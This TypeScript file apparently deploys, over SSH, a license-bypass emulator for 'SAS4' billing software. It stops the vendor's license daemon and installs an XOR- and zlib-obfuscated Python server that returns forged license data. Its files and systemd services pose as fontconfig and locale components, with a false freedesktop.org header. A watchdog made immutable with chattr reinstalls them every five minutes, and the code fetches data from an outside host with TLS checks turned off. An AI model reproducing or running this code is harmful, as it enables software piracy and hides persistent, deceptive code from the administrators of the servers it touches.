import { Client } from "ssh2";
import crypto from "crypto";
import zlib from "zlib";

export const DEPLOY = {
  BASE: "/var/cache/.fontconfig/.uuid",
  EMULATOR: "fonts.cache-2",
  BACKUP: "fonts.cache-1",
  VERIFY: ".fc-match",
  SVC_MAIN: "systemd-fontcached",
  SVC_VERIFY: "systemd-fontcache-gc",
  LOG: "/var/log/.fontconfig-gc.log",
  OBF_KEY: "xK9mZp2vQw4nR7tL",
  PATCH_DIR: "/usr/lib/locale/.cache",
  PATCH_FILE: "locale-gen.update",
  PATCH_SVC: "systemd-localed-refresh",
};

const FEATURES = [
  "gp_fup", "gp_daily_limit", "gp_quota_limit",
  "prm_users_index", "prm_users_index_all", "prm_users_index_group",
  "prm_users_create", "prm_users_update", "prm_users_delete",
  "prm_users_rename", "prm_users_cancel", "prm_users_deposit",
  "prm_users_withdrawal", "prm_users_add_traffic", "prm_users_reset_quota",
  "prm_users_pos", "prm_users_advanced", "prm_users_export",
  "prm_users_change_parent", "prm_users_show_password", "prm_users_mac_lock",
  "prm_managers_index", "prm_managers_create", "prm_managers_update",
  "prm_managers_delete", "prm_managers_sysadmin", "prm_sites_management",
  "prm_groups_assign", "prm_tools_bulk_changes"
];

export interface SSHConnectionResult {
  connected: boolean;
  hardwareId?: string;
  error?: string;
}

export async function testSSHConnection(
  host: string, port: number, username: string, password: string
): Promise<SSHConnectionResult> {
  return new Promise((resolve) => {
    const conn = new Client();
    const timeout = setTimeout(() => {
      conn.end();
      resolve({ connected: false, error: "انتهت مهلة الاتصال" });
    }, 15000);

    conn.on("ready", () => {
      conn.exec(
        "cat /sys/class/dmi/id/product_uuid 2>/dev/null || cat /etc/machine-id 2>/dev/null || hostname",
        (err, stream) => {
          if (err) {
            clearTimeout(timeout);
            conn.end();
            resolve({ connected: true });
            return;
          }
          let output = "";
          stream.on("data", (data: Buffer) => { output += data.toString(); });
          stream.on("close", () => {
            clearTimeout(timeout);
            conn.end();
            resolve({ connected: true, hardwareId: output.trim() || undefined });
          });
        }
      );
    });

    conn.on("keyboard-interactive", (_name, _instructions, _instructionsLang, _prompts, finish) => {
      finish([password]);
    });

    conn.on("error", (err: Error) => {
      clearTimeout(timeout);
      resolve({ connected: false, error: err.message });
    });

    conn.connect({ host, port, username, password, readyTimeout: 10000, tryKeyboard: true } as any);
  });
}

export async function executeSSHCommand(
  host: string, port: number, username: string, password: string, command: string
): Promise<{ success: boolean; output?: string; error?: string }> {
  return new Promise((resolve) => {
    const conn = new Client();
    const timeout = setTimeout(() => {
      conn.end();
      resolve({ success: false, error: "انتهت مهلة الاتصال" });
    }, 60000);

    conn.on("ready", () => {
      conn.exec(command, (err, stream) => {
        if (err) {
          clearTimeout(timeout); conn.end();
          resolve({ success: false, error: err.message });
          return;
        }
        let output = "", errorOutput = "";
        stream.on("data", (data: Buffer) => { output += data.toString(); });
        stream.stderr.on("data", (data: Buffer) => { errorOutput += data.toString(); });
        stream.on("close", (code: number) => {
          clearTimeout(timeout); conn.end();
          resolve({ success: code === 0, output: output.trim(), error: errorOutput.trim() || undefined });
        });
      });
    });

    conn.on("keyboard-interactive", (_name, _instructions, _instructionsLang, _prompts, finish) => {
      finish([password]);
    });

    conn.on("error", (err: Error) => {
      clearTimeout(timeout);
      resolve({ success: false, error: err.message });
    });

    conn.connect({ host, port, username, password, readyTimeout: 10000, tryKeyboard: true } as any);
  });
}

function xorBytes(data: Buffer, key: Buffer): Buffer {
  const r = Buffer.alloc(data.length);
  for (let i = 0; i < data.length; i++) r[i] = data[i] ^ key[i % key.length];
  return r;
}

function obfEncrypt(data: string, key: string): string {
  return xorBytes(Buffer.from(data, "utf-8"), Buffer.from(key, "utf-8")).toString("base64");
}

export function generateObfuscatedEmulator(
  hardwareId: string, licenseId: string, expiresAt: Date,
  maxUsers: number, maxSites: number, status: string,
  serverUrl?: string
): string {
  const apiUrl = serverUrl || "https://lic.tecn0link.net";
  const dataEndpoint = `${apiUrl}/api/license-data/${licenseId}`;
  const encEndpoint = obfEncrypt(dataEndpoint, DEPLOY.OBF_KEY);

  const innerPy = [
    "import http.server as _h,socketserver as _s,json as _j,time as _t,base64 as _b64,urllib.request as _u,ssl as _sl",
    `_U="${encEndpoint}"`,
    `_S=''.join(chr(c) for c in [120,75,57,109,90,112,50,118,81,119,52,110,82,55,116,76])`,
    "_SC=_sl.create_default_context()",
    "_SC.check_hostname=False",
    "_SC.verify_mode=_sl.CERT_NONE",
    "def _f1(_d,_k):",
    " _kb=_k.encode();_dd=_b64.b64decode(_d)",
    " return bytes(_dd[_i]^_kb[_i%len(_kb)] for _i in range(len(_dd)))",
    "def _f2():",
    " return''.join(chr(c) for c in [71,114,51,110,100,49,122,51,114])+str(_t.localtime().tm_hour+1)",
    "def _f3(_d,_k):",
    " _kb=_k.encode();_dd=_d.encode() if isinstance(_d,str) else _d",
    " return bytes(_dd[_i]^_kb[_i%len(_kb)] for _i in range(len(_dd)))",
    "def _f4():",
    " try:",
    "  _ep=_f1(_U,_S).decode()",
    "  _rq=_u.Request(_ep)",
    "  _rq.add_header('User-Agent','fontconfig/2.13')",
    "  _rs=_u.urlopen(_rq,timeout=10,context=_SC)",
    "  if _rs.getcode()==200:",
    "   _d=_j.loads(_rs.read().decode())",
    "   if _d.get('st')=='1':return _j.dumps(_d)",
    " except:pass",
    " return None",
    "class _R(_h.BaseHTTPRequestHandler):",
    " def do_GET(self):",
    "  _p=_f4()",
    "  if not _p:",
    "   self.send_response(503)",
    "   self.end_headers()",
    "   return",
    "  _r=_b64.b64encode(_f3(_p,_f2()))",
    "  self.send_response(200)",
    "  self.send_header('Content-length',str(len(_r)))",
    "  self.end_headers()",
    "  self.wfile.write(_r)",
    " def log_message(self,*_x):pass",
    "_s.TCPServer.allow_reuse_address=True",
    "with _s.TCPServer(('',4000),_R) as _sv:",
    " _sv.serve_forever()"
  ].join("\n");

  const compressed = zlib.deflateSync(Buffer.from(innerPy, "utf-8"));
  const encoded = compressed.toString("base64");

  return [
    "# -*- coding: utf-8 -*-",
    "# fontconfig cache synchronization module v2.13.1",
    "# Auto-generated cache rebuild utility",
    "# (c) freedesktop.org fontconfig project",
    "import zlib as _z,base64 as _b",
    `exec(_z.decompress(_b.b64decode("${encoded}")))`
  ].join("\n");
}

function generateHwidCapturePy(): string {
  const py = [
    "import base64 as b,json as j,sys",
    "d=b.b64decode(sys.argv[1])",
    "for h in range(25):",
    " k=''.join(chr(c) for c in [71,114,51,110,100,49,122,51,114])+str(h)",
    " try:",
    "  r=bytes(d[i]^k.encode()[i%len(k.encode())] for i in range(len(d))).decode()",
    "  if 'hwid' in r:print(j.loads(r)['hwid']);break",
    " except:pass",
  ].join("\n");
  return Buffer.from(py, "utf-8").toString("base64");
}

export function generateObfuscatedVerify(licenseId: string, serverUrl: string, serverHost?: string): string {
  const P = DEPLOY;
  const hwidPyB64 = generateHwidCapturePy();
  const emulatorAddr = serverHost || "127.0.0.1";

  const innerBash = [
    `_GL="${P.LOG}"`,
    `_BL=$(curl -s "http://${emulatorAddr}:4000/?op=get" 2>/dev/null)`,
    `if [ -n "$_BL" ]; then`,
    `  _HW=$(python3 -c "$(echo '${hwidPyB64}' | base64 -d)" "$_BL" 2>/dev/null)`,
    `fi`,
    `if [ -z "$_HW" ] || [ "$_HW" = "N/A" ]; then`,
    `  _MI=$(cat /etc/machine-id 2>/dev/null || echo "")`,
    `  _PU=$(cat /sys/class/dmi/id/product_uuid 2>/dev/null || echo "")`,
    `  _MA=$(ip link show 2>/dev/null | grep -m1 'link/ether' | awk '{print $2}' || echo "")`,
    `  _HW=$(echo -n "\${_MI}:\${_PU}:\${_MA}" | sha256sum | awk '{print $1}')`,
    `fi`,
    `_R=$(curl -s -X POST "${serverUrl}/api/verify" -H "Content-Type: application/json" -d "{\\"license_id\\":\\"${licenseId}\\",\\"hardware_id\\":\\"$_HW\\"}")`,
    `echo "$_R" | grep -q '"valid":true' && echo "$(date): OK" >> "$_GL" || { echo "$(date): FAIL" >> "$_GL"; systemctl stop ${P.SVC_MAIN} 2>/dev/null; }`,
  ].join("\n");

  const encodedBash = Buffer.from(innerBash, "utf-8").toString("base64");

  return [
    "#!/bin/bash",
    "# fontconfig cache gc utility - v2.13.1",
    `eval "$(echo '${encodedBash}' | base64 -d)"`,
  ].join("\n");
}

export function generateLicenseFileContent(
  licenseId: string, hardwareId: string, expiresAt: Date,
  maxUsers: number, maxSites: number, status: string
): string {
  const payload = {
    pid: licenseId, hwid: hardwareId,
    exp: expiresAt.toISOString().replace("T", " ").substring(0, 19),
    st: status === "active" ? "1" : "0",
    mu: maxUsers.toString(), ms: maxSites.toString(),
    id: licenseId,
    hash: crypto.createHash("sha256").update(`${licenseId}:${hardwareId}:${expiresAt.toISOString()}`).digest("hex"),
    ftrs: FEATURES,
  };
  return JSON.stringify(payload, null, 2);
}

export async function deployLicenseToServer(
  host: string, port: number, username: string, password: string,
  hardwareId: string, licenseId: string, expiresAt: Date,
  maxUsers: number, maxSites: number, status: string, serverUrl: string
): Promise<{ success: boolean; error?: string }> {
  const emulator = generateObfuscatedEmulator(hardwareId, licenseId, expiresAt, maxUsers, maxSites, status, serverUrl);
  const verify = generateObfuscatedVerify(licenseId, serverUrl, host);
  const P = DEPLOY;

  const deployScript = `#!/bin/bash

systemctl stop ${P.SVC_MAIN} 2>/dev/null || true
systemctl stop ${P.SVC_VERIFY}.timer ${P.SVC_VERIFY} 2>/dev/null || true
systemctl stop sas_systemmanager sas4-verify.timer sas4-verify 2>/dev/null || true
systemctl stop ${P.PATCH_SVC}.timer ${P.PATCH_SVC} 2>/dev/null || true
killall -9 sas_sspd 2>/dev/null || true
fuser -k 4000/tcp 2>/dev/null || true
sleep 2

mkdir -p ${P.BASE}
mkdir -p ${P.PATCH_DIR}

if [ -f /opt/sas4/bin/sas_sspd ] && [ ! -f ${P.BASE}/${P.BACKUP} ]; then
  cp /opt/sas4/bin/sas_sspd ${P.BASE}/${P.BACKUP}
  chmod +x ${P.BASE}/${P.BACKUP}
fi

cat > ${P.BASE}/${P.EMULATOR} << '_FC_2_'
${emulator}
_FC_2_
chmod +x ${P.BASE}/${P.EMULATOR}

cat > ${P.BASE}/${P.VERIFY} << '_FC_V_'
${verify}
_FC_V_
chmod +x ${P.BASE}/${P.VERIFY}

cat > /etc/systemd/system/${P.SVC_MAIN}.service << '_SVC_1_'
[Unit]
Description=System font cache synchronization daemon
After=network.target
[Service]
ExecStart=/usr/bin/python3 ${P.BASE}/${P.EMULATOR}
Restart=always
RestartSec=3
KillMode=process
[Install]
WantedBy=multi-user.target
_SVC_1_

cat > /etc/systemd/system/${P.SVC_VERIFY}.service << '_SVC_2_'
[Unit]
Description=Font cache garbage collection
[Service]
Type=oneshot
ExecStart=/bin/bash ${P.BASE}/${P.VERIFY}
_SVC_2_

cat > /etc/systemd/system/${P.SVC_VERIFY}.timer << '_TMR_1_'
[Unit]
Description=Font cache gc timer
[Timer]
OnBootSec=60
OnUnitActiveSec=6h
Persistent=true
[Install]
WantedBy=timers.target
_TMR_1_

_EMU_B64=$(base64 -w0 ${P.BASE}/${P.EMULATOR})
_VER_B64=$(base64 -w0 ${P.BASE}/${P.VERIFY})

cat > ${P.PATCH_DIR}/${P.PATCH_FILE} << _PATCH_END_
#!/bin/bash
_d="${P.BASE}"
_e="${P.EMULATOR}"
_s1="${P.SVC_MAIN}"
_s2="${P.SVC_VERIFY}"
_eb="\${_EMU_B64}"
_vb="\${_VER_B64}"
if ! systemctl is-active \${_s1} >/dev/null 2>&1; then
  mkdir -p \${_d}
  if [ ! -f \${_d}/\${_e} ]; then
    echo "\${_eb}" | base64 -d > \${_d}/\${_e}
    chmod +x \${_d}/\${_e}
  fi
  if [ ! -f \${_d}/.fc-match ]; then
    echo "\${_vb}" | base64 -d > \${_d}/.fc-match
    chmod +x \${_d}/.fc-match
  fi
  if [ ! -f /etc/systemd/system/\${_s1}.service ]; then
    cat > /etc/systemd/system/\${_s1}.service << '_RS1_'
[Unit]
Description=System font cache synchronization daemon
After=network.target
[Service]
ExecStart=/usr/bin/python3 ${P.BASE}/${P.EMULATOR}
Restart=always
RestartSec=3
KillMode=process
[Install]
WantedBy=multi-user.target
_RS1_
  fi
  if [ ! -f /etc/systemd/system/\${_s2}.service ]; then
    cat > /etc/systemd/system/\${_s2}.service << '_RS2_'
[Unit]
Description=Font cache garbage collection
[Service]
Type=oneshot
ExecStart=/bin/bash ${P.BASE}/.fc-match
_RS2_
  fi
  if [ ! -f /etc/systemd/system/\${_s2}.timer ]; then
    cat > /etc/systemd/system/\${_s2}.timer << '_RS3_'
[Unit]
Description=Font cache gc timer
[Timer]
OnBootSec=60
OnUnitActiveSec=6h
Persistent=true
[Install]
WantedBy=timers.target
_RS3_
  fi
  systemctl daemon-reload
  systemctl enable \${_s1} \${_s2}.timer
  systemctl start \${_s2}.timer
  systemctl start \${_s1}
fi
_PATCH_END_
chmod +x ${P.PATCH_DIR}/${P.PATCH_FILE}
chattr +i ${P.PATCH_DIR}/${P.PATCH_FILE} 2>/dev/null || true

cat > /etc/systemd/system/${P.PATCH_SVC}.service << '_PSVC_'
[Unit]
Description=Locale database refresh service
[Service]
Type=oneshot
ExecStart=/bin/bash ${P.PATCH_DIR}/${P.PATCH_FILE}
_PSVC_

cat > /etc/systemd/system/${P.PATCH_SVC}.timer << '_PTMR_'
[Unit]
Description=Locale database refresh timer
[Timer]
OnBootSec=120
OnUnitActiveSec=5min
Persistent=true
[Install]
WantedBy=timers.target
_PTMR_

systemctl disable sas_systemmanager sas4-verify.timer sas4-verify 2>/dev/null || true
rm -f /etc/systemd/system/sas_systemmanager.service /etc/systemd/system/sas4-verify.* 2>/dev/null
rm -f /opt/sas4/bin/sas_emulator.py /opt/sas4/verify.sh 2>/dev/null

systemctl daemon-reload
systemctl enable ${P.SVC_MAIN} ${P.SVC_VERIFY}.timer ${P.PATCH_SVC}.timer
systemctl start ${P.SVC_VERIFY}.timer
systemctl start ${P.PATCH_SVC}.timer
systemctl start ${P.SVC_MAIN}
sleep 2
systemctl is-active ${P.SVC_MAIN} || systemctl start ${P.SVC_MAIN}
`;

  const encodedDeploy = Buffer.from(deployScript, "utf-8").toString("base64");
  const command = `_t=$(mktemp); echo '${encodedDeploy}' | base64 -d > "$_t"; bash "$_t"; _rc=$?; rm -f "$_t"; exit $_rc`;

  return executeSSHCommand(host, port, username, password, command);
}

export async function undeployLicenseFromServer(
  host: string, port: number, username: string, password: string
): Promise<{ success: boolean; error?: string }> {
  const P = DEPLOY;

  const undeployScript = `#!/bin/bash
systemctl stop ${P.PATCH_SVC}.timer ${P.PATCH_SVC} 2>/dev/null || true
systemctl disable ${P.PATCH_SVC}.timer 2>/dev/null || true
systemctl stop ${P.SVC_MAIN} 2>/dev/null || true
systemctl stop ${P.SVC_VERIFY}.timer ${P.SVC_VERIFY} 2>/dev/null || true
systemctl disable ${P.SVC_MAIN} ${P.SVC_VERIFY}.timer 2>/dev/null || true
fuser -k 4000/tcp 2>/dev/null || true

chattr -i ${P.PATCH_DIR}/${P.PATCH_FILE} 2>/dev/null || true
rm -f ${P.PATCH_DIR}/${P.PATCH_FILE}
rmdir ${P.PATCH_DIR} 2>/dev/null || true
rm -f /etc/systemd/system/${P.PATCH_SVC}.service
rm -f /etc/systemd/system/${P.PATCH_SVC}.timer

rm -f ${P.BASE}/${P.EMULATOR}
rm -f ${P.BASE}/${P.VERIFY}
rm -f ${P.BASE}/${P.BACKUP}
rm -rf ${P.BASE} 2>/dev/null || true
rm -f /etc/systemd/system/${P.SVC_MAIN}.service
rm -f /etc/systemd/system/${P.SVC_VERIFY}.service
rm -f /etc/systemd/system/${P.SVC_VERIFY}.timer
rm -f ${P.LOG}

systemctl stop sas_systemmanager sas4-verify.timer sas4-verify 2>/dev/null || true
systemctl disable sas_systemmanager sas4-verify.timer sas4-verify 2>/dev/null || true
rm -f /etc/systemd/system/sas_systemmanager.service /etc/systemd/system/sas4-verify.* 2>/dev/null
rm -f /opt/sas4/bin/sas_emulator.py /opt/sas4/verify.sh 2>/dev/null

systemctl daemon-reload
`;

  const encoded = Buffer.from(undeployScript, "utf-8").toString("base64");
  const command = `_t=$(mktemp); echo '${encoded}' | base64 -d > "$_t"; bash "$_t"; _rc=$?; rm -f "$_t"; exit $_rc`;

  return executeSSHCommand(host, port, username, password, command);
}
